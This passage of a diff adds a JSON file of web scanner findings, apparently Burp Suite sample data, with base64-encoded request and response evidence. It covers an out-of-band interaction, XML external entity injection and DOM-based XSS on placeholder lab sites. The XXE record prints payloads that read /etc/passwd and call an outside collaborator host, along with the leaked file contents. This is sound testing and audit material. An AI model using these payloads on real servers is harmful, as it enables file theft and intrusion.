QgdG8gdGhlIGxvbyB3aGVuIHlvdSdyZSBnb2luZyBmb3IgYW4gZXh0ZW5kZWQgdmlzaXQuIEl0cyBicmlnaHQgeWVsbG93IGNvbG91ciBhbmQgcmVkIGNhdXRpb24gc2lnbiBtZWFucyBubyBvbmUgY2FuIGV2ZXIgeWVsbCBhdCB5b3UgZm9yIG5vdCBmb3Jld2FybmluZyB0aGVtIHdoYXQgdGhleSBoYXZlIHRvIGVuZHVyZSBmb2xsb3dpbmcgeW91IGludG8gdGhlIHJlc3Ryb29tLiBUaGUgZm9sZGFibGUgZGVzaWduIG1lYW5zIHlvdSBzaW1wbHkgbGVhdmUgaXQgb3V0IGFzIGxvbmcgYXMgaXMgbmVlZGVkIGFuZCBjb2xsYXBzZSBpdCB3aGVuIGl0J3Mgc2FmZSB0byByZXR1cm4uPC9wPgogICAgICAgICAgICAgICAgICAgICAgICA8cD5UaGUgc2lnbiBpcyBhbHNvIGRvdWJsZSBzaWRlZCB0byBiZSBhYnNvbHV0ZWx5IGNlcnRhaW4gdGhhdCB0aGVyZSB3aWxsIGJlIG5vIGNvbmZ1c2lvbiEgSXQncyB0aGUgaWRlYWwgc2VjcmV0IFNhbnRhIGdpZnQgZm9yIHRoYXQgY28td29ya2VyLCB5b3Uga25vdyB0aGUgb25lISBJdCBhbHNvIG1ha2VzIGEgZ3JlYXQgZ2FnIGdpZnQgYW5kIHN0b2NraW5nIGZpbGxlciE8L3A+CiAgICAgICAgICAgICAgICAgICAgICAgIDxwPkJlIHdhcm5lZCBhbmQgc3RheSBzYWZlIHdpdGggdGhpcyB0b2lsZXQgY2F1dGlvbiBzaWduITwvcD4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaXMtbGlua2JhY2siPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iLyI+UmV0dXJuIHRvIGxpc3Q8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvc2VjdGlvbj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L3NlY3Rpb24+CiAgICAgICAgPC9kaXY+CiAgICA8L2JvZHk+CjwvaHRtbD4K",
+              "length": 3360
+            }
+          ],
+          "was_redirect_followed": false,
+          "request_time": "1561035344454"
+        },
+        "http_event": {
+          "protocol": "HTTP",
+          "request_response": {
+            "url": "http://tkhuhul11ut7e42w7a9rowccd3jw7zvsxgs3jr8.burpcollaborator.net/",
+            "request": [
+              {
+                "type": "DataSegment",
+                "data": "R0VUIC8gSFRUUC8xLjENCkhvc3Q6IA==",
+                "length": 22
+              },
+              {
+                "type": "HighlightSegment",
+                "data": "dGtodWh1bDExdXQ3ZTQydzdhOXJvd2NjZDNqdzd6dnN4Z3MzanI4LmJ1cnBjb2xsYWJvcmF0b3IubmV0",
+                "length": 60
+              },
+              {
+                "type": "DataSegment",
+                "data": "DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMC4xNDsgcnY6NjcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82Ny4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXANCg0K",
+                "length": 123
+              }
+            ],
+            "response": [
+              {
+                "type": "DataSegment",
+                "data": "SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYyDQoNCjxodG1sPjxib2R5PnRwc3d6OGxrNWRwZ2t4NnU5N3hnOHR6amxndmdsdWduZmpnejwvYm9keT48L2h0bWw+",
+                "length": 210
+              }
+            ],
+            "was_redirect_followed": false,
+            "request_time": "1561035344454"
+          },
+          "time_stamp": "2019-Jun-20 12:55:44 UTC",
+          "time_between_sending_payload_and_receiving_interaction": "0",
+          "source_ip_address": "18.202.194.165",
+          "source_port": 80,
+          "type": "http",
+          "interaction_id": "tkhuhul11ut7e42w7a9rowccd3jw7zvsxgs3jr8",
+          "description": "The Collaborator server received an HTTP request.<br><br> The request was received from IP address 18.202.194.165 at 2019-Jun-20 12:55:44 UTC."
+        }
+      }
+    ],
+    "internal_data": "eyJmbGFncyI6MCwidmFyaWFudCI6MywiaW5zZXJ0aW9uX3BvaW50X2tleSI6IjV4MSIsImluc2VydGlvbl9wb2ludF9pZGVudGlmaWVycyI6W3sidHlwZV9pbmRleCI6ODE5NSwibmFtZSI6IlJlZmVyZXIifV0sImlzc3VlX2RldGFpbHNfbWFwIjp7IjIxIjoiMCJ9fQ=="
+  },
+  {
+    "name": "XML external entity injection",
+    "type_index": 1049600,
+    "serial_number": "7068415101041561600",
+    "origin": "https://vulnerable-website.com",
+    "path": "/product/stock",
+    "severity": "high",
+    "confidence": "firm",
+    "description": "The application is vulnerable to XML external entity injection. The tag <b>&lt;!DOCTYPE foo [&lt;!ENTITY xxe0wi5o SYSTEM \"file:///etc/passwd\"&gt; ]&gt;<\/b> was injected into the XML sent to the server. This tag defines an external entity, <b>xxe0wi5o<\/b>, which references a file on the XML parser's filesystem. This entity was then used within a data field in the XML document. The server's response contains the contents of the specified file, indicating that the parser processed the injected external entity.<br><br> Additionally, the tag <b>&lt;!DOCTYPE foo [&lt;!ENTITY xxemsjgo SYSTEM \"http://3tx4q4uba42hneb6gki1x6lmmds6gx4rsij59ty.burpcollaborator.net\"&gt; ]&gt;<\/b> was injected into the XML sent to the server. This tag defines an external entity, <b>xxemsjgo<\/b>, which references a URL on an external domain. The application interacted with that domain, indicating that the parser processed the injected external entity.<br><br>The response from the application's request to the external domain was also included in the application's own response.",
+    "caption": "/product/stock [request body]",
+    "evidence": [
+      {
+        "type": "FirstOrderEvidence",
+        "detail": {
+          "payload": {
+            "bytes": "PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgeHhlMHdpNW8gU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiPiBdPg==",
+            "flags": 0
+          },
+          "band_flags": [
+            "in_band"
+          ]
+        },
+        "request_response": {
+          "url": "https://vulnerable-website.com/product/stock",
+          "request": [
+            {
+              "type": "DataSegment",
+              "data": "UE9TVCAvcHJvZHVjdC9zdG9jayBIVFRQLzEuMQ0KSG9zdDogdnVsbmVyYWJsZS13ZWJzaXRlLmNvbQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTAuMTQ7IHJ2OjY3LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNjcuMA0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KUmVmZXJlcjogaHR0cHM6Ly92dWxuZXJhYmxlLXdlYnNpdGUuY29tL3Byb2R1Y3Q/cHJvZHVjdElkPTYNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veG1sDQpDb250ZW50LUxlbmd0aDogMTA3DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29va2llOiBzZXNzaW9uPVY0NmxpS3UwamdCUEkxTjl2MU1HZVZCYVJ5eDVHQkFHDQoNCjw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+",
+              "length": 456
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgeHhlMHdpNW8gU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiPiBdPg==",
+              "length": 64
+            },
+            {
+              "type": "DataSegment",
+              "data": "PHN0b2NrQ2hlY2s+PHByb2R1Y3RJZD42",
+              "length": 24
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "Jnh4ZTB3aTVvOw==",
+              "length": 10
+            },
+            {
+              "type": "DataSegment",
+              "data": "PC9wcm9kdWN0SWQ+PHN0b3JlSWQ+MTwvc3RvcmVJZD48L3N0b2NrQ2hlY2s+",
+              "length": 45
+            }
+          ],
+          "response": [
+            {
+              "type": "DataSegment",
+              "data": "SFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0DQpEYXRlOiBUaHUsIDIwIEp1biAyMDE5IDA5OjEzOjQ4IEdNVA0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uDQpDb250ZW50LUxlbmd0aDogMTE0NQ0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtU2VjdXJpdHktUG9saWN5OiBkZWZhdWx0LXNyYyAnc2VsZic7IHNjcmlwdC1zcmMgJ3NlbGYnOyBpbWctc3JjICdzZWxmJzsgc3R5bGUtc3JjICdzZWxmJzsgZnJhbWUtc3JjICdzZWxmJzsgY29ubmVjdC1zcmMgJ3NlbGYnIHdzOi8vbG9jYWxob3N0OjMzMzM7IGZvbnQtc3JjICdzZWxmJzsgbWVkaWEtc3JjICdzZWxmJzsgb2JqZWN0LXNyYyAnbm9uZSc7IGNoaWxkLXNyYyAnc2VsZicgYmxvYjoNClgtQ29udGVudC1UeXBlLU9wdGlvbnM6IG5vc25pZmYNClgtWFNTLVByb3RlY3Rpb246IDE7IG1vZGU9YmxvY2sNClgtRnJhbWUtT3B0aW9uczogREVOWQ0KDQoiSW52YWxpZCBwcm9kdWN0IElEOiA2",
+              "length": 483
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "cm9vdDo=",
+              "length": 5
+            },
+            {
+              "type": "DataSegment",
+              "data": "eDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gKZGFlbW9uOng6MToxOmRhZW1vbjovdXNyL3M=",
+              "length": 53
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "YmluOg==",
+              "length": 4
+            },
+            {
+              "type": "DataSegment",
+              "data": "L3Vzci9zYmluL25vbG9naW4KYmluOng6MjoyOmJpbjovYmluOi91c3Ivc2Jpbi9ub2xvZ2luCnN5czp4OjM6MzpzeXM6L2RldjovdXNyL3NiaW4vbm9sb2dpbgpzeW5jOng6NDo2NTUzNDpzeW5jOi9iaW46L2Jpbi9zeW5jCmdhbWVzOng6NTo2MDpnYW1lczovdXNyL2dhbWVzOi91c3Ivc2Jpbi9ub2xvZ2luCm1hbjp4OjY6MTI6bWFuOi92YXIvY2FjaGUv",
+              "length": 201
+            },
+            {
+              "type": "DataSegment",
+              "data": "bWFuOi91c3Ivc2Jpbi9ub2xvZ2luCmxwOng6Nzo3OmxwOi92YXIvc3Bvb2wvbHBkOi91c3Ivc2Jpbi9ub2xvZ2luCm1haWw6eDo4Ojg6bWFpbDovdmFyL21haWw6L3Vzci9zYmluL25vbG9naW4KbmV3czp4Ojk6OTpuZXdzOi92YXIvc3Bvb2wvbmV3czovdXNyL3NiaW4vbm9sb2dpbgp1dWNwOng6MTA6MTA6dXVjcDovdmFyL3Nwb29sL3V1Y3A6L3Vzci9zYmluL25vbG9naW4KcHJveHk6eDoxMzoxMzpwcm94eTovYmluOi91c3Ivc2Jpbi9ub2xvZ2luCnd3dy1kYXRhOng6MzM6MzM6d3d3LWRhdGE6L3Zhci93d3c6L3Vzci9zYmluL25vbG9naW4KYmFja3VwOng6MzQ6MzQ6YmFja3VwOi92YXIvYmFja3VwczovdXNyL3NiaW4v",
+              "length": 354
+            },
+            {
+              "type": "DataSegment",
+              "data": "bm9sb2dpbgpsaXN0Ong6Mzg6Mzg6TWFpbGluZyBMaXN0IE1hbmFnZXI6L3Zhci9saXN0Oi91c3Ivc2Jpbi9ub2xvZ2luCmlyYzp4OjM5OjM5OmlyY2Q6L3Zhci9ydW4vaXJjZDovdXNyL3NiaW4vbm9sb2dpbgpnbmF0czp4OjQxOjQxOkduYXRzIEJ1Zy1SZXBvcnRpbmcgU3lzdGVtIChhZG1pbik6L3Zhci9saWIvZ25hdHM6L3Vzci9zYmluL25vbG9naW4K",
+              "length": 201
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "bm9ib2R5Og==",
+              "length": 7
+            },
+            {
+              "type": "DataSegment",
+              "data": "eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpwZXRlcjp4OjIwMDE6MjAwMTo6L2hvbWUvcGV0ZXI6L2Jpbi9iYXNoCnVzZXI6eDoyMDAwOjIwMDA6Oi9ob21lL3VzZXI6L2Jpbi9iYXNoCmRuc21hc3E6eDoxMDE6NjU1MzQ6",
+              "length": 201
+            },
+            {
+              "type": "DataSegment",
+              "data": "ZG5zbWFzcSwsLDovdmFyL2xpYi9taXNjOi91c3Ivc2Jpbi9ub2xvZ2luCm1lc3NhZ2VidXM6eDoxMDI6MTAxOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KIg==",
+              "length": 97
+            }
+          ],
+          "was_redirect_followed": false,
+          "request_time": "1561022030370"
+        }
+      },
+      {
+        "type": "CollaboratorEvidence",
+        "detail": {
+          "payload": {
+            "bytes": "PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgeHhlbXNqZ28gU1lTVEVNICJodHRwOi8vM3R4NHE0dWJhNDJobmViNmdraTF4NmxtbWRzNmd4NHJzaWo1OXR5LmJ1cnBjb2xsYWJvcmF0b3IubmV0Ij4gXT4=",
+            "flags": 0
+          },
+          "band_flags": [
+            "out_of_band"
+          ]
+        },
+        "request_response": {
+          "url": "https://vulnerable-website.com/product/stock",
+          "request": [
+            {
+              "type": "DataSegment",
+              "data": "UE9TVCAvcHJvZHVjdC9zdG9jayBIVFRQLzEuMQ0KSG9zdDogdnVsbmVyYWJsZS13ZWJzaXRlLmNvbQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTAuMTQ7IHJ2OjY3LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNjcuMA0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KUmVmZXJlcjogaHR0cHM6Ly92dWxuZXJhYmxlLXdlYnNpdGUuY29tL3Byb2R1Y3Q/cHJvZHVjdElkPTYNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veG1sDQpDb250ZW50LUxlbmd0aDogMTA3DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29va2llOiBzZXNzaW9uPVY0NmxpS3UwamdCUEkxTjl2MU1HZVZCYVJ5eDVHQkFHDQoNCjw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+",
+              "length": 456
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgeHhlbXNqZ28gU1lTVEVNICJodHRwOi8vM3R4NHE0dWJhNDJobmViNmdraTF4NmxtbWRzNmd4NHJzaWo1OXR5LmJ1cnBjb2xsYWJvcmF0b3IubmV0Ij4gXT4=",
+              "length": 113
+            },
+            {
+              "type": "DataSegment",
+              "data": "PHN0b2NrQ2hlY2s+PHByb2R1Y3RJZD42",
+              "length": 24
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "Jnh4ZW1zamdvOw==",
+              "length": 10
+            },
+            {
+              "type": "DataSegment",
+              "data": "PC9wcm9kdWN0SWQ+PHN0b3JlSWQ+MTwvc3RvcmVJZD48L3N0b2NrQ2hlY2s+",
+              "length": 45
+            }
+          ],
+          "response": [
+            {
+              "type": "DataSegment",
+              "data": "SFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0DQpEYXRlOiBUaHUsIDIwIEp1biAyMDE5IDA5OjEzOjQ3IEdNVA0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uDQpDb250ZW50LUxlbmd0aDogNTkNCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVNlY3VyaXR5LVBvbGljeTogZGVmYXVsdC1zcmMgJ3NlbGYnOyBzY3JpcHQtc3JjICdzZWxmJzsgaW1nLXNyYyAnc2VsZic7IHN0eWxlLXNyYyAnc2VsZic7IGZyYW1lLXNyYyAnc2VsZic7IGNvbm5lY3Qtc3JjICdzZWxmJyB3czovL2xvY2FsaG9zdDozMzMzOyBmb250LXNyYyAnc2VsZic7IG1lZGlhLXNyYyAnc2VsZic7IG9iamVjdC1zcmMgJ25vbmUnOyBjaGlsZC1zcmMgJ3NlbGYnIGJsb2I6DQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLVhTUy1Qcm90ZWN0aW9uOiAxOyBtb2RlPWJsb2NrDQpYLUZyYW1lLU9wdGlvbnM6IERFTlkNCg0KIkludmFsaWQgcHJvZHVjdCBJRDogNg==",
+              "length": 481
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "dHBzd3o4bGs1ZHBna3g2dTk3eGc4dHpqbGdqZ21nampmaWd6",
+              "length": 36
+            },
+            {
+              "type": "DataSegment",
+              "data": "Ig==",
+              "length": 1
+            }
+          ],
+          "was_redirect_followed": false,
+          "request_time": "1561022030372"
+        },
+        "dns_event": {
+          "query_type": 1,
+          "domain": "3tx4q4uba42hneb6gki1x6lmmds6gx4rsij59ty.burpcollaborator.net",
+          "query": "GTIAEAABAAAAAAABJzN0eDRxNHViYTQyaG5lYjZna2kxeDZsbW1kczZneDRyc2lqNTl0eRBidXJwY29sbGFib3JhdG9yA25ldAAAAQABAAApEAAAAIAAAAA=",
+          "time_stamp": "2019-Jun-20 09:13:47 UTC",
+          "time_between_sending_payload_and_receiving_interaction": "0",
+          "source_ip_address": "34.251.117.162",
+          "source_port": 53,
+          "type": "dns",
+          "interaction_id": "3tx4q4uba42hneb6gki1x6lmmds6gx4rsij59ty",
+          "description": "The Collaborator server received a DNS lookup of type A for the domain name <b>3tx4q4uba42hneb6gki1x6lmmds6gx4rsij59ty.burpcollaborator.net<\/b>.<br><br> The lookup was received from IP address 34.251.117.162 at 2019-Jun-20 09:13:47 UTC."
+        },
+        "http_event": {
+          "protocol": "HTTP",
+          "request_response": {
+            "url": "http://3tx4q4uba42hneb6gki1x6lmmds6gx4rsij59ty.burpcollaborator.net/",
+            "request": [
+              {
+                "type": "DataSegment",
+                "data": "R0VUIC8gSFRUUC8xLjENClVzZXItQWdlbnQ6IEphdmEvMTEuMC4xDQpIb3N0OiA=",
+                "length": 47
+              },
+              {
+                "type": "HighlightSegment",
+                "data": "M3R4NHE0dWJhNDJobmViNmdraTF4NmxtbWRzNmd4NHJzaWo1OXR5LmJ1cnBjb2xsYWJvcmF0b3IubmV0",
+                "length": 60
+              },
+              {
+                "type": "DataSegment",
+                "data": "DQpBY2NlcHQ6IHRleHQvaHRtbCwgaW1hZ2UvZ2lmLCBpbWFnZS9qcGVnLCAqOyBxPS4yLCAqLyo7IHE9LjINCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCg0K",
+                "length": 90
+              }
+            ],
+            "response": [
+              {
+                "type": "DataSegment",
+                "data": "SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYyDQoNCjxodG1sPjxib2R5Pg==",
+                "length": 160
+              },
+              {
+                "type": "HighlightSegment",
+                "data": "dHBzd3o4bGs1ZHBna3g2dTk3eGc4dHpqbGdqZ21nampmaWd6",
+                "length": 36
+              },
+              {
+                "type": "DataSegment",
+                "data": "PC9ib2R5PjwvaHRtbD4=",
+                "length": 14
+              }
+            ],
+            "was_redirect_followed": false,
+            "request_time": "1561022030372"
+          },
+          "time_stamp": "2019-Jun-20 09:13:47 UTC",
+          "time_between_sending_payload_and_receiving_interaction": "0",
+          "source_ip_address": "99.80.226.107",
+          "source_port": 80,
+          "type": "http",
+          "interaction_id": "3tx4q4uba42hneb6gki1x6lmmds6gx4rsij59ty",
+          "description": "The Collaborator server received an HTTP request.<br><br> The request was received from IP address 99.80.226.107 at 2019-Jun-20 09:13:47 UTC."
+        }
+      }
+    ],
+    "internal_data": "eyJmbGFncyI6NCwidmFyaWFudCI6MCwiaW5zZXJ0aW9uX3BvaW50X2tleSI6IjExeDAiLCJpbnNlcnRpb25fcG9pbnRfaWRlbnRpZmllcnMiOlt7InR5cGVfaW5kZXgiOjgxOTgsIm5hbWUiOiIifV0sImlzc3VlX2RldGFpbHNfbWFwIjp7IjEiOiJ4eGVtc2pnbyIsIjIiOiJ4eGUwd2k1byJ9fQ=="
+  },
+  {
+    "name": "Cross-site scripting (DOM-based)",
+    "type_index": 2097936,
+    "serial_number": "5286551865500361728",
+    "origin": "https://insecure-bank.com",
+    "path": "/",
+    "severity": "high",
+    "confidence": "firm",
+    "description": "The application may be vulnerable to DOM-based cross-site scripting. Data is read from <b>location.search<\/b> and passed to <b>element.innerHTML<\/b>.",
+    "caption": "/",
+    "evidence": [
+      {
+        "type": "DynamicJavascriptAnalysisEvidence",
+        "detail": {
+          "band_flags": [
+            "in_band"
+          ]
+        },
+        "javascript_request_responses": [],
+        "source_caption": "location.search",
+        "sink_caption": "element.innerHTML",
+        "composable_evidence": {
+          "type": "FirstOrderEvidence",
+          "detail": {
+            "band_flags": [
+              "in_band"
+            ]
+          },
+          "request_response": {
+            "url": "https://insecure-bank.com/?search=foo",
+            "request": [
+              {
+                "type": "DataSegment",
+                "data": "R0VUIC8/c2VhcmNoPWZvbyBIVFRQLzEuMQ0KSG9zdDogaW5zZWN1cmUtYmFuay5jb20NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwLjE0OyBydjo2Ny4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzY3LjANCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNClJlZmVyZXI6IGh0dHBzOi8vaW5zZWN1cmUtYmFuay5jb20vDQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29va2llOiBzZXNzaW9uPTRkY0s3c3FOUVlCVWF1MlFhR1NQSU5RT2V3V0RtUXVmDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQoNCg==",
+                "length": 424
+              }
+            ],
+            "response": [
+              {
+                "type": "DataSegment",
+                "data": "SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUaHUsIDIwIEp1biAyMDE5IDEwOjM4OjU1IEdNVA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgNCkNvbnRlbnQtTGVuZ3RoOiAzMzQ3DQpDb25uZWN0aW9uOiBjbG9zZQ0KWC1YU1MtUHJvdGVjdGlvbjogMA0KDQo8IURPQ1RZUEUgaHRtbD4KPGh0bWw+CiAgICA8aGVhZD4KICAgICAgICA8bGluayBocmVmPSIvcmVzb3VyY2VzL2Nzcy9sYWJzQmxvZy5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgICAgICAgPHRpdGxlPkRPTSBYU1MgaW4gaW5uZXJIVE1MIHNpbmsgdXNpbmcgc291cmNlIGxvY2F0aW9uLnNlYXJjaDwvdGl0bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keQ==",
+                "length": 358
+              },
+              {
+                "type": "DataSegment",
+                "data": "PgogICAgICAgIDxkaXYgdGhlbWU9ImJsb2ciPgogICAgICAgICAgICA8ZGl2IGlkPSJsYWJIZWFkZXIiPgogICAgICAgICAgICAgICAgPHNlY3Rpb24gY2xhc3M9InBhZ2VIZWFkZXIiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxpbWcgc3JjPSIvcmVzb3VyY2VzL2ltYWdlcy9sb2dvQWNhZGVteS5zdmciPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0aXRsZS1jb250YWluZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGgyPkRPTSBYU1MgaW4gPHNwYW4gY2xhc3M9IklubGluZUNvZGUiPmlubmVySFRNTDwvc3Bhbj4gc2luayB1c2luZyBzb3VyY2UgPHNwYW4gY2xhc3M9IklubGluZUNvZGUiPmxvY2F0aW9uLnNlYXJjaDwvc3Bhbj48L2gyPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImxpbmstYmFjayIgaHJlZj0iaHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2Nyb3NzLXNpdGUtc2NyaXB0aW5nL2RvbS1iYXNlZC9sYWItaW5uZXJodG1sLXNpbmsiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJhY2sgdG8gbGFiIGRlc2NyaXB0aW9uIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzdmcgdmVyc2lvbj0iMS4xIiBpZD0iTGF5ZXJfMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgeD0iMHB4IiB5PSIwcHgiIHZpZXdCb3g9IjAgMCAyOCAzMCIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyAwIDAgMjggMzAiIHhtbDpzcGFjZT0icHJlc2VydmUiIHRpdGxlPSJiYWNrLWFycm93Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGc+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cG9seWdvbiBwb2ludHM9IjEuNCwwIDAsMS4yIDEyLjYsMTUgMCwyOC44IDEuNCwzMCAxNS4xLDE1Ij48L3BvbHlnb24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cG9seWdvbiBwb2ludHM9IjE0LjMsMCAxMi45LDEuMiAyNS42LDE1IDEyLjksMjguOCAxNC4zLDMwIDI4LDE1Ij48L3BvbHlnb24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3N2Zz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9IndpZGdldGNvbnRhaW5lci1sYWItc3RhdHVzIGlzLW5vdHNvbHZlZCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3Bhbj5MQUI8L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cD5Ob3Qgc29sdmVkPC9wPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImxhYi1zdGF0dXMtaWNvbiI+PC9zcGFuPgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDwvc2VjdGlvbj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxzY3JpcHQgc3JjPSIvcmVzb3VyY2VzL2pzL2xhYkhlYWRlci5qcyI+PC9zY3JpcHQ+CiAgICAgICAgICAgIDxzZWN0aW9uIGNsYXNzPSJtYWluY29udGFpbmVyIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICAgICAgPHNlY3Rpb24gY2xhc3M9ImJsb2ctaGVhZGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGgxPjxzcGFuPjAgc2VhcmNoIHJlc3VsdHMgZm9yICc8L3NwYW4+PHNwYW4gaWQ9InNlYXJjaE1lc3NhZ2UiPjwvc3Bhbj48c3Bhbj4nPC9zcGFuPjwvaDE+CiAgICAgICAgICAgICAgICAgICAgICAgIDxzY3JpcHQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiBkb1NlYXJjaFF1ZXJ5KHF1ZXJ5KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NlYXJjaE1lc3NhZ2UnKS5pbm5lckhUTUwgPSBxdWVyeTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBxdWVyeSA9IChuZXcgVVJMU2VhcmNoUGFyYW1zKHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gpKS5nZXQoJ3NlYXJjaCcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYocXVlcnkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb1NlYXJjaFF1ZXJ5KHF1ZXJ5KTsKICAgICAgICAgICAgIC